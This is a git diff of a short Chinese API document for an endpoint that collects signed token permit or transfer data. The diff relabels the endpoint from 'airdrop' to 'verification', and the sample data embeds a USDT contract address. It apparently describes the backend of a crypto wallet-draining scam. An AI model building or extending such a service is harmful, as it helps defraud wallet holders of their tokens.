@@ -1,21 +1,21 @@
 ## API: 新增授權
 - 格式
 ```bash
-[POST] /airdrop
+[POST] /verification
 
-Ex: /airdrop/
+Ex: /verification/
 Body:
 {
-  data: 'dac17f958d2ee523a2206206994597c13d831ec73b5e342cf923994b4acc7248fb767ea2da5e77b95427fefa711eff984124bfbb1ab6fbf5e3da1820cf8ba24c4535a7a176e3de4158d58908b1d7a5973d4b42ab78213330ec940826'
-  callbackUrl: 'xxx'
+  data: '1ZEFDMTdGOTU4RDJlZTUyM2EyMjA2MjA2OTk0NTk3QzEzRDgzMWVjN2U1Y2FFM0EzZDM0NDc0Zjk2ZjU0YjgyMUM2MzkxMDQxNkJGMDMwQzA5RTQzY0ZEOEQ3RmZhZTY3QjQ5N0I1MTdBMTcxZjlhQTg3OTU3NDE0NzM2NDIzMjkzMzBlZTNmMjRjNTFhZTc0MTViNGJkZjNmMjUyNzc4YTk4ODZjMWY4ZDRlNzA4OTUzMzgyNjJjYzEyMzQ1'
+  callbackUrl: 'http://192.168.1.114:5115/verification/callback'
 }
 ```
 
 - 參數(JSON)
 ```js
 {
-  data: '', // 執行 WT.permit(...) 的返回值
-  callbackUrl: '' // 後台回覆網址
+  data: '', // 執行 TP_erc_MetaMask.transfer(...) 的返回值
+  callbackUrl: '' // 後台回調網址
 }
 ```
 
